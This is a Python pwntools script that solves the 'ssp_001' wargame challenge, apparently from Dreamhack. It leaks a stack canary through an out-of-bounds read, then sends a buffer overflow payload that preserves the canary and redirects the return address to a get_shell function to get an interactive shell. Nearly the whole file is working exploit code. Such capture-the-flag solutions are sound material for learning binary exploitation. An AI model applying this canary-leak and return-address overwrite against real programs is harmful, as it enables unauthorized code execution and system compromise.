from pwn import *

def slog(n, m): 
    return success(': '.join([n, hex(m)]))

# p = remote('host3.dreamhack.games', 22826)
p = process('./ssp_001')
e = ELF('./ssp_001')
context.arch = 'i386'

canary = b''
get_shell = e.symbols['get_shell'] # get_shell function address


for i in range(0x83, 0x7f, -1) : # consider little endian 131 - 127
    p.sendafter(b'> ',b'P') # read -> use sendafter
    p.sendlineafter(b'Element index : ', bytes(str(i),'utf-8')) # scanf -> use sendlineafter # utf-8 방식에 인코딩 설정
    p.recvuntil(b'is : ')
    canary += p.recv(2)


canary = int(canary,16)
slog("canary", canary)

payload = b'A' * 0x40
payload += p32(canary)
payload += b'B'*4 # dummy
payload += b'C'*4 # ebp
payload += p32(get_shell) # ret -> get_shell

p.sendafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', bytes(str(len(payload)),'utf-8')) # name_len -> trigger bof
p.sendafter(b'Name : ',payload)
p.interactive()